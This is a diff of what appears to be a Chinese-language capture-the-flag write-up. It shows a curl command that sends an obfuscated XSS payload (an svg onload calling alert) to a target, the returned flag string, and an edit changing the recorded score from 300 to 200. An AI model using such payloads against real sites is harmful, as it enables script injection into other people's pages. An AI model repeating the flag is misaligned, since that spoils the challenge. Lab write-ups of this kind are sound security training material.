@@ -84,7 +84,7 @@ curl --get --data-urlencode "name=<svg/onload=top['ale'+'rt']('XSS')>" http://$T
 Congratulations!<p> Here is the flag: flag{5ed1cede-9aee-420e-ab55-1eacf8e8cd88}
 ```
 
-提交：`correct: true, awarded: 300`。
+提交：`correct: true, awarded: 200`。
 
 ## 走不通 / 走过的弯路（留档）
 
